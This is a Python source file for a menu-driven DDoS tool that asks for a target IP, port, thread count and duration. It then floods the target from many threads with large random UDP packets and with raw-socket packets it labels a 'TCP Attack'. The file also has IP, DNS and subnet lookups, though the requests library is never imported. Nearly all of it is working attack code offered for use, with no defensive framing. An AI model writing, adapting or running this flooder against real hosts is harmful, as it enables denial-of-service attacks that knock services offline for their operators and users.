import os
import socket
import sys
import threading
import random
import datetime
from urllib.parse import urlparse
from colorama import Fore, init

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            sys.stdout.flush()
            sys.stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            sys.stdout.flush()
            sys.stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

##############################################################################################
def get_info_l4():
    sys.stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    sys.stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    sys.stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    sys.stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t
##############################################################################################

#region layer4

def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads = []
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
            threads.append(thd)
        except:
            pass
    for thd in threads:
        thd.join()

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass

def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    threads = []
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
            threads.append(thd)
        except:
            pass
    for thd in threads:
        thd.join()

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass

#endregion

def clear(): 
    if os.name == 'nt': 
        os.system('cls')
    else: 
        os.system('clear')
##############################################################################################
def help():
    clear()
    sys.stdout.write("                                                                                         \n")
    sys.stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
    sys.stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╠═╣║╣ ║  ╠═╝             \n")
    sys.stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╩ ╩╚═╝╩═╝╩                \n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTCYAN_EX+"║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit  DDoS                             "+Fore.LIGHTCYAN_EX+"║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
    sys.stdout.write("\n")
##############################################################################################
def layer4():
    clear()
    sys.stdout.write("                                                                                         \n")
    sys.stdout.write("                               "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    sys.stdout.write("                               "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    sys.stdout.write("                               "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    sys.stdout.write("\n")
##############################################################################################
def tools():
    clear()
    sys.stdout.write("                                                                                         \n")
    sys.stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    sys.stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ║ ║ ║║ ║║  ╚═╗             \n")
    sys.stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTCYAN_EX+"                     ║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.LIGHTCYAN_EX+"                     ║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"               ║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    sys.stdout.write("\n")
##############################################################################################
def title():
    sys.stdout.write("                                                                                         \n")
    sys.stdout.write("                               "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    sys.stdout.write("                               "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    sys.stdout.write("                               "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"        Welcome To The Main Screen Of DDoS   "+Fore.LIGHTCYAN_EX  +"       ║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"          Type [help] to see the Commands    "+Fore.LIGHTCYAN_EX +"       ║\n")
    sys.stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════╝\n")
    sys.stdout.write("\n")
##############################################################################################
def command():
    sys.stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"DDos"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        payload = random._urandom(60000)  # UDP 공격에 사용할 무작위 데이터 (60000 바이트)
        threading.Thread(target=runsender, args=(target, port, thread, t, payload)).start()  # payload 전달
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()

    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        payload = random._urandom(4096)  # TCP 공격에 사용할 무작위 데이터 (4096 바이트)
        threading.Thread(target=runflooder, args=(target, port, thread, t)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()

    elif command == "subnet":
        sys.stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')                   

    elif command == "dns":
        sys.stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')

    elif command == "geoip":
        sys.stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
        sys.stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  

if __name__ == '__main__':
    init(convert=True)
    clear()
    title()
    while True:
        command()
